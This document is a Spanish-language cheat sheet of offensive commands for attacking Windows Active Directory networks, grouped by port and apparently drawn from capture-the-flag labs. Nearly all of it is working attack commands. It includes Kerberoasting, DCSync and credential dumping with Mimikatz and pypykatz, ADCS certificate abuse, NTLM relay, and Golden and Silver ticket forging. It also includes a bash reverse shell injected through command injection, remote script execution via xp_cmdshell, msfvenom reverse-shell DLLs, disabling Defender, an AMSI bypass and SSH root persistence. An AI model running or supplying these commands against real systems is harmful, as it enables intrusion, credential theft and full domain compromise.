Lista final de comandos agrupados por servicio/puerto
🟢 Nmap / Reconocimiento general

    nmap -p- --min-rate=1000 -T4 <IP> | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$// #Escaneo completo de puertos TCP y extracción de lista de puertos separados por comas

    nmap -p$ports -sC -sV <IP> #Escaneo dirigido con scripts por defecto y detección de versiones

    nmap -sU --min-rate=400 --min-parallelism=512 --open <IP> #Escaneo UDP para descubrir servicios como DNS, Kerberos y NTP

    ffuf -w <wordlist> -u http://<host> -H "Host: FUZZ.<domain>" -fs <size> #Fuzzing de vhosts/subdominios filtrando por tamaño de respuesta

    gobuster dir -u https://<host> -w <wordlist> --no-tls-validation #Fuzzing de directorios en web

    gobuster vhost -q -u http://<host> --append-domain -w <wordlist> #Fuzzing de vhosts

    echo "<IP> <hostname> <dominio>" | sudo tee -a /etc/hosts #Añade resolución DNS local

🟢 DNS (puerto 53)

    python3 krbrelayx/dnstool.py -u '<user>' -p '<pass>' -r <record>.<domain> -a add -t A -d <ATTACKER_IP> <DC_IP> #Añade registro DNS malicioso apuntando al atacante

    bloodyAD -d <domain> -k --host <DC> add dnsRecord <name> <ATTACKER_IP> #Añade registro DNS vía LDAP/Kerberos

🔵 Kerberos (puerto 88)

    sudo ntpdate <DC_IP> #Sincroniza el reloj con el DC (necesario para Kerberos)

    sudo net time set -S <domain> #Sincroniza reloj en Windows/Linux

    echo '<pass>' | kinit <user> #Solicita TGT para un usuario

    kinit -V -k -t <keytab> -f '<user>' #Solicita TGT usando keytab

    kinit -f '<user>$' #Solicita TGT forwardable (necesario para delegación)

    klist #Lista tickets Kerberos en caché

    ktutil + addent -p <user> -k 1 -key -e rc4-hmac + wkt <file> #Crea keytab con hash NT

    export KRB5CCNAME=<file>.ccache #Establece la caché Kerberos a usar

    impacket-getTGT <domain>/<user> -dc-ip <IP> #Solicita TGT con Impacket

    impacket-getTGT <domain>/<user> -hashes :<NThash> #Solicita TGT con Pass-the-Hash

    impacket-ticketConverter <file>.kirbi <file>.ccache #Convierte kirbi a ccache

    impacket-describeTicket <file>.ccache #Inspecciona contenido del ticket (session key, flags)

    GetNPUsers.py <domain>/ -no-pass -usersfile <users> -dc-ip <IP> #ASREPRoasting (usuarios sin preautenticación)

    GetUserSPNs.py -no-preauth <user> -request -usersfile <users> <domain>/ -dc-ip <IP> #Kerberoasting sin credenciales usando usuario sin preauth

    python3 targetedKerberoast.py -d <domain> -u <user> -p '<pass>' --request-user <target> --dc-ip <IP> #Asigna SPN y solicita TGS para crackear

    netexec ldap <IP> -d <domain> -u <user> -H <hash> -k --kerberoasting <out> #Kerberoasting con NetExec

    john -w=/usr/share/wordlists/rockyou.txt <hash> #Crackea hash TGS/ASREP

    hashcat -m 13100 <hash> /usr/share/wordlists/rockyou.txt #Crackea hash TGS (etype 23)

    hashcat -m 19900 <hash> /usr/share/wordlists/rockyou.txt #Crackea hash ASREP (etype 18)

    hashcat -m 5600 <hash> /usr/share/wordlists/rockyou.txt #Crackea hash NTLMv2

    hashcat -m 3200 <hash> /usr/share/wordlists/rockyou.txt #Crackea hash bcrypt

🔵 LDAP (puertos 389 / 636 / 3268 / 3269)

    ldapwhoami -Y GSSAPI -H ldap://<DC> #Verifica autenticación LDAP con Kerberos

    ldapsearch -D '<user>' -w '<pass>' -p 389 -h <IP> -b "dc=<domain>,dc=<tld>" -s sub "*" | grep <attr> #Consulta atributos LDAP

    ldapsearch -H ldap://<domain> -b 'DC=<domain>,DC=<tld>' sAMAccountName 'CN=Users,...' #Enumera usuarios

    ldapmodify -H ldap://<domain> + fichero LDIF #Modifica atributos LDAP

    bloodyAD -d <domain> -u '<user>' -p '<pass>' --host <DC> get object '<DN>' --attr <attr> #Lee atributos (ej. msDS-ManagedPassword)

    bloodyAD -d <domain> -u '<user>' -p '<pass>' --host <DC> add groupMember <group> <user> #Añade usuario a grupo

    bloodyAD -d <domain> -u '<user>' -p '<pass>' --host <DC> remove groupMember <group> <user> #Elimina usuario de grupo

    bloodyAD -d <domain> -u '<user>' -p '<pass>' --host <DC> set password <user> '<newpass>' #Cambia contraseña

    bloodyAD -d <domain> -u '<user>' -p '<pass>' --host <DC> set owner <target> <newowner> #Cambia propietario de objeto

    bloodyAD -d <domain> -u '<user>' -p '<pass>' --host <DC> add genericAll <target> <principal> #Otorga GenericAll

    bloodyAD -d <domain> -u '<user>' -p '<pass>' --host <DC> remove uac <user> -f ACCOUNTDISABLE #Habilita cuenta

    bloodyAD -d <domain> -u '<user>' -p '<pass>' --host <DC> set object <user> servicePrincipalName -v '<spn>' #Añade SPN

    impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal '<user>' -target-dn '<DN>' <domain>/<user>:'<pass>' #Propaga permisos a objetos hijos de OU

    netexec ldap <IP> -u <user> -p '<pass>' -M ldap-checker #Verifica LDAP signing/channel binding

    netexec ldap <IP> -u <user> -p '<pass>' -M maq #Obtiene MachineAccountQuota

    netexec ldap <IP> -u <user> -p '<pass>' -M adcs #Enumera servicios ADCS

    netexec ldap <IP> -u <user> -p '<pass>' --gmsa #Lee contraseñas GMSA

    netexec ldap <IP> -d <domain> -u '<user>$' -p '<pass>' -k #Autenticación LDAP con Kerberos

    netexec ldap <IP> -d <domain> -u users.txt -p '<pass>' -k #Password spraying con Kerberos

    netexec ldap <IP> -d <domain> -u '<user>' -H '<hash>' -k --users #Enumera usuarios del dominio

    netexec ldap <IP> -u <user> -p '<pass>' -k --kerberoasting <out> #Kerberoasting

🔴 SMB (puerto 445)

    smbclient -L <IP> #Enumera shares SMB (null-session/anónimo)

    smbclient -U '<user>%<pass>' '//<host>/<share>' #Conexión a share SMB

    smbclient -N \\\\<IP>\\<share> -c ls | awk '{ print $1 }' #Lista contenido de share anónimo

    smbclient //<host>/<share> --use-kerberos=required #Acceso a share con Kerberos

    netexec smb <IP> -u <user> -p '<pass>' --shares #Enumera shares con credenciales

    netexec smb <IP> -u <user> -p '<pass>' -M spider_plus -o DOWNLOAD_FLAG=True #Descarga recursiva del share

    netexec smb <IP> -u <user> -p '<pass>' -d <domain> -k --shares --spider <share> --regex . #Spider recursivo de un share con Kerberos

    netexec smb <IP> -u <user> -p '<pass>' -d <domain> -k --share <share> --get-file '<remote>' <local> #Descarga fichero de share

    netexec smb <IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success #Password guessing (user=pass)

    netexec smb <IP> -u users.txt -p '<pass>' --continue-on-success #Password spraying

    netexec smb <IP> -u <user> -H <hash> #Pass-the-Hash

    netexec smb <IP> -u <user> -p '<pass>' -d <domain> -k --shares #Enumera shares con Kerberos

    netexec smb <IP> -u <user> -p '<pass>' -d <domain> -k --generate-krb5-file <out> #Genera krb5.conf

    sudo smbserver.py <share> . -smb2support #Servidor SMB para exfiltración/captura

    impacket-smbserver share -smb2support . -user test -password test #Servidor SMB con autenticación

    net use n: \\<ATTACKER_IP>\<share> /user:<user> <pass> #Monta share SMB atacante en el objetivo

    nxc smb <IP> -u '<user>' -p '' --shares #Enumera shares con autenticación de invitado

🔴 RPC (puertos 135 / 593 / 445)

    lookupsid.py <user>@<IP> -no-pass #RID cycling para enumerar usuarios

    lookupsid.py <user>@<IP> 10000 -no-pass #RID cycling con RID máximo ampliado

    lookupsid.py -k -no-pass -target-ip <IP> <DC> #RID cycling con Kerberos

    rpcclient -U <domain>/<user> <IP> #Conexión RPC

    setuserinfo <user> 23 <newpass> #Cambia contraseña vía RPC (nivel 23)

    impacket-changepasswd -hashes :<old> -newhash :<new> '<domain>/<user>'@<DC> #Cambia contraseña usando hashes

    impacket-changepasswd -k -altuser <user>@<DC> -no-pass -newhashes :<hash> '<domain>/<user>:<pass>@<DC>' #Cambia hash NT (SPN-less RBCD)

    impacket-secretsdump -k -just-dc-user <user> <DC> #DCSync

    impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL #Extrae hashes de ficheros volcados

    impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL #Extrae hashes de NTDS.dit + SYSTEM

🟠 WinRM (puertos 5985 / 5986)

    evil-winrm -i <IP> -u <user> -p '<pass>' #Shell WinRM con credenciales

    evil-winrm -i <IP> -u <user> -H <hash> #Shell WinRM con Pass-the-Hash

    evil-winrm -i <DC> -r <domain> #Shell WinRM con Kerberos (usando KRB5CCNAME)

    evil-winrm -S -i <DC> -r <domain> #Shell WinRM sobre SSL con Kerberos

    evil-winrm -S -i <DC> -c cert.crt -k private.key #Shell WinRM con certificado

    evil-winrm -i <IP> -u '<user>$' -H <hash> #Shell WinRM como cuenta de máquina

🟣 MSSQL (puertos 1433 / 6520 y personalizados)

    impacket-mssqlclient -windows-auth <domain>/<user>@<IP> -p <port> #Conexión interactiva MSSQL con auth Windows

    enum_links #Enumera linked servers

    use_link <linked_server> #Cambia al linked server

    SELECT name,type_desc,is_disabled FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name #Lista logins sysadmin

    enable_xp_cmdshell #Habilita xp_cmdshell

    xp_cmdshell powershell iex(iwr -uri http://<IP>/shell.ps1 -UseBasicParsing) #Ejecuta PowerShell vía xp_cmdshell

    xp_dirtree \\<host>\C$ #Fuerza autenticación SMB (coerción)

    select result from openquery("<LINK>", 'select suser_name() as result') #Consulta usuario actual en linked server

    select result from openquery("<LINK>", 'select distinct b.name ... where a.permission_name = ''IMPERSONATE'';') #Enumera logins impersonables

    select result from openquery("<LINK>", 'execute as login = ''sa''; select suser_name() as result') #Impersona sa

    exec ('execute as login = ''sa''; exec sp_configure ''show advanced options'', 1; reconfigure; exec sp_configure ''xp_cmdshell'', 1; reconfigure;') at "<LINK>" #Habilita xp_cmdshell en linked server

    exec ('execute as login = ''sa''; exec xp_cmdshell ''whoami''') at "<LINK>" #RCE en linked server

🟡 HTTP / HTTPS (puertos 80 / 443 / 8000 / 8008 / 8443 / 5000)

    curl -v http://<host> #Inspecciona cabeceras (revela tecnologías)

    curl "http://<host>/ghost/api/v3/content/posts/?extra=../../../../etc/passwd&key=<key>" #Path traversal / LFI

    curl -X POST http://<host>/api-dev/scan -H 'X-DEV-INTRANET-KEY: <key>' -H 'Content-Type: application/json' -d '{"url":"; whoami"}' #Command injection

    curl -X POST http://<host>/api-dev/scan ... -d '{"url":"; bash -i >& /dev/tcp/<IP>/<port> 0>&1"}' #Reverse shell bash

    Invoke-WebRequest -Uri "http://<host>/MonitorService" -Method POST -ContentType "text/xml; charset=utf-8" -Headers @{SOAPAction = "..."} -Body $payload #Petición SOAP (command injection)

    office2john <file>.xlsx > hash #Extrae hash de contraseña de Excel

    zip <archive>.odt -r * #Reempaqueta ODT tras modificar content.xml

    unzip <archive>.odt #Inspecciona contenido de ODT/ZIP

    python3 -m http.server <port> #Servidor HTTP para servir ficheros al objetivo

    python3 phis.py <port> #Servidor HTTP para capturar exfiltración (XSS)

🔵 ADCS / Certipy (RPC 135 + LDAP 636)

    certipy find -u '<user>' -p '<pass>' -dc-ip <IP> -stdout #Enumera plantillas y vulnerabilidades ADCS

    certipy-ad find -target <DC> -u <user> -p '<pass>' #Enumera plantillas (versión nueva)

    certipy-ad find -dc-host <DC> -u <user>@<domain> -p '<pass>' -vulnerable -stdout #Solo plantillas vulnerables

    certipy req -u <user> -p '<pass>' -target <DC> -ca '<CA>' -template '<T>' #Solicita certificado con plantilla

    certipy-ad req -k -u <user>@<domain> -target <DC> -ca '<CA>' -template '<T>' -on-behalf-of '<domain>\<target>' -pfx <user>.pfx -dcom #Solicitud on-behalf-of vía DCOM

    certipy req -ca <CA> -username <user> -p '<pass>' -dc-ip <IP> -template WebServer --application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip <IP> #ESC15: inyecta política de Enrollment Agent

    certipy req -u <user> -p '<pass>' -dc-ip <IP> -target-ip <IP> -ca <CA> -template User -on-behalf-of '<domain>\administrator' -pfx <user>.pfx #Solicitud on-behalf-of

    certipy-ad shadow add -k -u <user>@<domain> -account <target> -target <DC> #Añade Shadow Credential

    certipy-ad shadow auto -u <user>@<domain> -p '<pass>' -account <target> -target <DC> -dc-ip <IP> -k #Shadow Credentials automático (obtiene hash NT)

    certipy-ad auth -pfx <file>.pfx -username <user> -domain <domain> -dc-ip <IP> #Autentica con certificado (obtiene TGT/hash)

    certipy-ad account update -username <user>@<domain> -password '<pass>' -user <target> -upn <target>.<suffix> -debug -scheme ldaps -target <DC> #Modifica UPN

    openssl pkcs12 -in <file>.pfx -nocerts -out private.key -nodes #Extrae clave privada del PFX

    openssl pkcs12 -in <file>.pfx -nokeys -out allcerts.pem #Extrae todos los certificados

    openssl pkcs12 -in <file>.pfx -clcerts -nokeys -out cert.crt #Extrae certificado de cliente

    crackpkcs12 <file>.pfx #Crackea contraseña del PFX

    openssl x509 -in cert.crt -noout -text #Inspecciona certificado

    Import-PfxCertificate -FilePath <pfx> -Password(ConvertTo-SecureString -String '<pass>' -AsPlainText -Force) -CertStoreLocation Cert:\CurrentUser\My #Importa PFX al almacén

🟣 Delegación / RBCD / S4U

    findDelegation.py <domain>/<user>:'<pass>' -dc-ip <DC> -k #Enumera delegaciones

    rbcd.py <domain>/<user>$ -hashes :<hash> -k -delegate-from <src> -delegate-to <dst> -action write -dc-ip <DC> -use-ldaps #Configura RBCD

    getST.py <domain>/<user>:'<pass>' -spn <spn> -impersonate <target> #S4U2Self+S4U2Proxy

    getST.py <domain>/<user> -hashes :<hash> -dc-ip <DC> -spn <spn> -impersonate <target> -self #Solo S4U2Self

    getST.py <domain>/<user>$ -hashes :<hash> -spn <spn> -additional-ticket <ccache> -impersonate <target> #S4U2Proxy con ticket adicional

    impacket-getST -spn '<spn>' -altservice '<altspn>' -impersonate <target> -dc-ip <DC> '<domain>/<user>:<pass>' #Cambia SPN vía altservice

    impacket-getST -k -no-pass -impersonate '<target>' -spn '<spn>' -u2u '<domain>/<user>$' #U2U + S4U2Self + S4U2Proxy

    Set-ADComputer <DC> -PrincipalsAllowedToDelegateToAccount <user> #Otorga RBCD sobre el DC

    Get-AdComputer <DC>$ -property PrincipalsAllowedToDelegateToAccount #Verifica quién puede delegar

    Get-DomainObject -Identity <user>$ #Verifica msDS-AllowedToActOnBehalfOfOtherIdentity

🔴 BloodHound

    bloodhound-python -d <domain> -u <user> -p '<pass>' -c all -ns <IP> --dns-tcp --zip #Recolección estándar

    bloodhound-python -u <user> -p '<pass>' -d <domain> -dc <DC> -c All -ns <IP> --zip #Recolección con DC explícito

    bloodhound-python -k -c All -u <user> -p '<pass>' -d <domain> -dc <DC> -ns <IP> --zip #Recolección con Kerberos

    bloodhound-python -c All -k -no-pass --auth-method kerberos -u <user> -d <domain> -dc <DC> -ns <IP> --zip #Recolección sin contraseña (TGT en caché)

    ./SharpHound.exe -c All #Recolección desde Windows

    neo4j console& + bloodhound #Arranca Neo4j y BloodHound

    MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p #Consulta Cypher: object control de cuentas owned

🔴 PowerView (Windows / Linux)

    iex (iwr -usebasicparsing http://<IP>/PowerView.ps1) #Carga PowerView en memoria

    add-domainobjectacl -rights "all" -targetidentity "<target>" -principalidentity "<principal>" #Otorga ACL sobre objeto

    $cred = ConvertTo-SecureString '<pass>' -AsPlainText -Force #Crea SecureString

    set-domainuserpassword <user> -accountpassword $cred #Cambia contraseña

    Get-ObjectAcl -Identity <obj> -Select SecurityIdentifier #Enumera ACLs

    Get-ObjectAcl -Identity <obj> -Where "SecurityIdentifier contains <principal>" #Filtra ACEs por principal

    Get-DomainObjectAcl -Identity <obj> #ACLs de objeto

    Add-DomainGroupMember -Identity <group> -Members <user> #Añade a grupo

    Get-DomainUser -Identity <user> #Info de usuario

    Get-ADObject -Identity <user> -Properties distinguishedName -NoCache #Verifica DN

    Set-ADObjectDN -Identity <user> -DestinationDN "<OU>" #Mueve objeto entre OUs

    (ConvertFrom-SddlString $sddl).DiscretionaryAcl #Convierte SDDL a ACEs

    get-domaintrust #Enumera trusts

    get-domainsid <domain> #Obtiene SID del dominio

    (Get-ADGroupMember -Identity "<group>").SamAccountName #Enumera miembros de grupo

    Get-ADUser -Filter {Enabled -eq $true} | Select-Object SamAccountName, Name #Lista usuarios habilitados

    get-adgroup "<group>" -properties * #Propiedades de grupo

    Enable-ADAccount -Identity <user> #Habilita cuenta

    Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted #Enumera objetos eliminados

    Get-ADObject -Filter 'objectSid -eq "<SID>"' -IncludeDeletedObjects -Properties * #Busca objeto por SID

    Restore-ADObject -Identity "<GUID>" #Restaura objeto de la papelera

    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} #Enumera tareas programadas

    Start-ScheduledTask -TaskName '<name>' #Ejecuta tarea programada

🟣 AD Recycle Bin (LDAP)

    Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties distinguishedName, objectSid -SearchBase 'CN=Deleted Objects,DC=...,DC=...' #Enumera objetos eliminados

    Restore-ADObject '<DN>' #Restaura objeto de la papelera

🔴 Windows local / Post-explotación

    whoami /all #Usuario, grupos, SIDs y privilegios

    whoami /priv #Privilegios del usuario

    whoami /groups #Grupos del usuario

    whoami /user #Usuario y SID

    dir C:\ #Lista raíz de C:

    type <file> #Lee fichero

    get-applockerPolicy -effective -xml #Política de AppLocker

    $ExecutionContext.SessionState.LanguageMode #Verifica Constrained Language Mode

    reg query HKLM\Software\Policies\Microsoft\WindowsFirewall\FirewallRules #Reglas de firewall

    reg query "HKLM\SOFTWARE\Classes\CLSID\{...}\InprocServer32" #Valor InprocServer32

    reg add "HKLM\SOFTWARE\Classes\CLSID\{...}\InprocServer32" /ve /t REG_SZ /d "<dll>" /f #Modifica InprocServer32 (DLL hijack)

    reg save HKLM\SYSTEM C:\system.hive #Exporta colmena SYSTEM

    icacls C:\ #Verifica permisos

    net user <user> #Info de usuario local

    netstat -ano | findstr <port> #Verifica puerto escuchando

    ps #Lista procesos

    qwinsta #Sesiones activas

    cmdkey /l #Enumera credenciales almacenadas

    Get-HotFix #Lista hotfixes instalados

    Set-MpPreference -DisableRealtimeMonitoring $True #Desactiva Defender

    Get-Module -ListAvailable #Módulos PowerShell disponibles

    Get-StoredCredential #Lee credenciales almacenadas

    accesschk64.exe -w -s -q -u Users "C:\Windows" >> windows.txt -accepteula #Busca rutas escribibles

🟣 Bypass / Herramientas de ataque

    nc -lvnp <port> #Listener de Netcat

    rlwrap nc -lvnp <port> #Listener con historial

    nc -lnvp <port> #Listener alternativo

    responder -I tun0 -v #Captura hashes NTLM (SMB/HTTP/MSSQL)

    sudo ./Responder.py -I tun0 #Responder

    sudo ./inveigh #Inveigh (alternativa a Responder)

    impacket-ntlmrelayx -t ldap://<DC> --http-port 8080 #Relay NTLM a LDAP

    impacket-ntlmrelayx -t https://<DC>/certsrv/certfnsh.asp --adcs --http-port 8080 #Relay NTLM a Web Enrollment

    impacket-ntlmrelayx -t ldaps://<DC> --http-port 8080 --add-dns-record '<record>' <IP> --no-dump --no-da --no-validate-privs #Relay + DNS record para Kerberos relay

    python3 printerbug.py '<domain>/<user>:<pass>'@<host> <record> #PrinterBug (coerción de autenticación)

    python3 krbrelayx.py -debug -t https://<DC>/certsrv/certfnsh.asp --adcs #Kerberos relay a Web Enrollment

    chisel server --reverse --port <port> #Servidor Chisel

    chisel client <IP>:<port> R:socks #Cliente Chisel (SOCKS reverso)

    chisel client <IP>:<port> <lport>:<rhost>:<rport> #Port forward con Chisel

    shisel.exe client <IP>:<port> R:socks #shisel (SOCKS reverso)

    ssh -fN -D 1080 root@<IP> #Túnel SOCKS dinámico

    ssh -fN -L <lport>:<rhost>:<rport> -p<port> <user>@<IP> #Port forwarding SSH

    proxychains4 -q -f /etc/proxychains.conf <cmd> #Ejecuta comando a través de proxychains

    sudo $(which sshd) -d -p<port> #Arranca sshd en puerto custom

    python3 -m http.server <port> #Servidor HTTP para transferir ficheros

    wget http://<IP>/<file> -O <out> #Descarga fichero

    curl http://<IP>/<file> -o <out> #Descarga fichero

    iwr -uri http://<IP>/<file> -o <out> #Descarga fichero con PowerShell

🟣 Exploits / Privilege Escalation

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f dll -o <out>.dll #Genera DLL con reverse shell

    x86_64-w64-mingw32-gcc -shared -o <out>.dll <src>.c #Compila DLL con mingw

    x86_64-w64-mingw32-gcc <src>.c -s -w -static -fpermissive -shared -o <out>.dll -m64 #Compila DLL (estática)

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe <src>.cs #Compila C# en Windows

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "<exe>" #Ejecuta binario vía InstallUtil (bypass AppLocker)

    SeManageVolumeExploit.exe #Explota SeManageVolumePrivilege

    .\EfsPotato.exe '<cmd>' #Explota SeImpersonatePrivilege (EfsPotato)

    Invoke-GodPotato -cmd "<cmd>" #GodPotato (SeImpersonatePrivilege)

    SharpEfsPotato.exe -a '<cmd>' #SharpEfsPotato

    Invoke-RunasCs -Username <user> -Password '<pass>' -LogonType 5 -BypassUAC -Command '<cmd>' #RunasCs (Logon Type 5)

    Invoke-RunasCs -Username <user> -Password '<pass>' -Domain <domain> -Command powershell.exe -Remote <IP>:<port> -ForceProfile #RunasCs con perfil forzado

    ./RunasCs.exe <user> '<pass>' -l 9 "<cmd>" #RunasCs Logon Type 9

    ./RunasCs.exe <user> '<pass>' powershell.exe -r <IP>:<port> #RunasCs reverse shell

    ./RunasCs.exe <user> '<pass>' "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command <cmd>" #RunasCs comando inline

    Set-AuthenticodeSignature <file> (dir Cert:\CurrentUser\My) -HashAlgorithm "SHA512" #Firma script con certificado

    ADFSDump.exe #Dumpea claves ADFS (Golden SAML)

    python3 ADFSpoof.py -b <TKSKey.bin> <DKMkey.bin> -s <spn> saml2 --endpoint '<url>' ... #Genera Golden SAML

    ntdsutil "ac i ntds" "ifm" "create full <path>" q q #Crea snapshot IFM de AD

    wbadmin start backup -backuptarget:\\<IP>\<share> -include:c:\windows\ntds #Backup de NTDS con wbadmin

    wbadmin get versions #Lista versiones de backup

    wbadmin start recovery -version:<v> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl #Restaura NTDS.dit

    diskshadow /s cmd #Ejecuta script de diskshadow (shadow copy)

    Copy-FileSeBackupPrivilege <src> <dst> -Overwrite #Copia ficheros con SeBackupPrivilege

    robocopy /b <src> <dst> #Copia con backup privileges

    mimikatz.exe 'lsadump::dcsync /user:krbtgt@<domain>' exit #DCSync con Mimikatz

    Invoke-Mimikatz -Command '"dpapi::chrome /in:<path> /unprotect"' #Extrae credenciales de Chrome/Edge

    Invoke-WCMDump #Extrae credenciales de Credential Manager

    impacket-dpapi masterkey -file <file> -sid <SID> -password '<pass>' #Descifra master key DPAPI

    impacket-dpapi credential -file <file> -key <hexkey> #Descifra blob DPAPI

🟣 Herramientas varias

    impacket-ticketer -nthash '<hash>' -domain <domain> -domain-sid '<SID>' -spn <spn> <user> #Forja Silver Ticket

    Rubeus.exe tgtdeleg /nowrap #Solicita TGT falso de delegación

    Rubeus.exe monitor /interval:5 /nowrap #Monitoriza TGTs entrantes

    Rubeus.exe golden /aes256:<key> /ldap /user:<user> /sids:<SID> /ptt #Forja Golden Ticket con ExtraSIDs

    ADFSDump.exe #Dumpea claves ADFS

    Certify.exe find, /vulnerable #Busca plantillas ADCS vulnerables

    Bypass-4MSI #Bypass de AMSI (Evil-WinRM)

    Invoke-Binary <exe> '<args>' #Ejecuta binario en memoria (Evil-WinRM)

    msfconsole + use post/multi/recon/local_exploit_suggester + set session <n> + exploit #Enumera exploits locales

    use exploit/windows/local/<exploit> + set session <n> + set LHOST <IP> + set LPORT <port> + exploit #Explota vulnerabilidad local

    getuid (meterpreter) #Verifica usuario actual

🟢 Web / CMS específicos

    cat overwatch.exe.config #Revisa configuración de app .NET

    strings -el <exe> #Extrae cadenas UTF-16LE (credenciales hardcodeadas)

    dotPeek <exe> #Decompila binario .NET

    cat /var/www/html/.../__init__.py #Busca credenciales en código

    less /var/www/html/.../__init__.py #Revisa configuración de app

🟢 SSL / OpenSSL

    openssl pkcs12 -in <pfx> -nocerts -out private.key -nodes #Extrae clave privada

    openssl pkcs12 -in <pfx> -nokeys -out allcerts.pem #Extrae certificados

    openssl pkcs12 -in <pfx> -clcerts -nokeys -out cert.crt #Extrae cert de cliente

    openssl x509 -in cert.crt -noout -text #Inspecciona certificado

    crackpkcs12 <pfx> #Crackea contraseña del PFX

🟢 ZipCrypto / Office

    7z l -slt <archive>.zip #Inspecciona ZIP y método de cifrado

    bin/extract <zip> <file> <out>.enc #Extrae fichero cifrado

    zip plain.zip <file> #Crea ZIP con plaintext

    bin/extract plain.zip <file> <out>.plain #Extrae plaintext

    bin/pkcrack -c <file>.enc -p <file>.plain #Ataque known plaintext (recupera claves)

    bin/zipdecrypt <key0> <key1> <key2> <in> <out> #Descifra ZIP

    unzip <archive>.zip #Extrae ZIP

    office2john <file>.xlsx > hash #Extrae hash de Excel

    john hash --wordlist=/usr/share/wordlists/rockyou.txt #Crackea hash de Office

🟢 Linux / WSL / SSH

    ssh <user>@<IP> -p <port> #Shell SSH

    ssh -i <key> <user>@<IP> -p <port> #SSH con clave

    ssh -K <user>@<IP> #SSH con Kerberos

    chmod 600 <key> #Permisos correctos para clave SSH

    scp <user>@<IP>:<remote> <local> #Copia fichero remoto

    scp -i <key> -P <port> "<user>@<IP>:<remote>" <local> #Copia con clave y puerto

    sudo ntpdate <IP> #Sincroniza reloj

    iptables-save #Reglas de firewall

    cat /etc/krb5.conf #Configuración Kerberos

    cat /etc/sssd/sssd.conf #Configuración SSSD

    ls -la /var/lib/sss/db #Caché de credenciales SSSD

    strings <ldb> | grep -A 15 -B 15 '\$' #Busca hashes en caché SSSD

    john --wordlist=/usr/share/wordlists/rockyou.txt <hash> #Crackea hash sha512crypt

    ksu #Cambia a root con Kerberos (.k5login)

    echo "ssh-rsa ..." >> /root/.ssh/authorized_keys #Persistencia SSH como root

    echo '<base64>' | base64 -d > <file> #Decodifica base64

    cat <file> | base64 -d > <out> #Decodifica base64 a fichero

    echo -n "<string>" | base64 -w0 ; echo #Codifica base64 sin saltos

🟢 Varios / Misc

    echo "10.10.11.x <host> <domain>" | sudo tee -a /etc/hosts #Añade entrada DNS local

    nxc smb <IP> -u '<user>' -p '<pass>' --generate-krb5-file <out> #Genera krb5.conf

    echo '<bloque krb5.conf>' | sudo tee /etc/krb5.conf #Instala krb5.conf

    nxc mssql <IP> -d <domain> -u '<user>' -p '<pass>' #Verifica credenciales MSSQL

    impacket-mssqlclient -windows-auth <domain>/<user>@<IP> -p <port> #Conexión MSSQL

    nxc smb <IP> -u '<user>' -p '<pass>' #Verifica credenciales SMB

    nxc smb <IP> -u '<user>' -p '<pass>' -d <domain> -k --shares #Enumera shares con Kerberos

    crackmapexec smb <IP> -u <user> -H <hash> #Pass-the-Hash (CME legacy)

    crackmapexec smb <IP> -u <user> -H <hash> --shares #Enumera shares con PtH

    kerbrute -users <users> -password '<pass>' -domain <domain> -dc-ip <DC> #Password spraying Kerberos

    kerbrute passwordspray -d <domain> --dc <IP> <users> '<pass>' #Password spraying

    pypykatz lsa minidump <dump> #Parsea dump de LSASS

    pypykatz lsa minidump <dump> | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes #Extrae hashes NT

    pypykatz lsa minidump <dump> | grep 'Username:' | awk '{ print $2 }' | sort -u > users #Extrae usuarios

    pypykatz crypto nt "<pass>" #Calcula hash NT de una contraseña

    python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "<pass>".encode("utf-16le")).digest()).decode())' #Genera hash NT

    impacket-smbexec -k <host> #Shell semi-interactiva vía SMB

    impacket-wmiexec -hashes :<hash> <user>@<IP> #Shell WMI con PtH

    wmiexec.py -k -no-pass <user>@<host> #Shell WMI con Kerberos

    impacket-ticketer ... #Forja tickets Kerberos

    targetedKerberoast.py ... #Kerberoasting dirigido

    timecrack.py <hashes> <wordlist> #Crackea hashes Timeroast

    nxc smb <DC> -k -M timeroast #Timeroasting
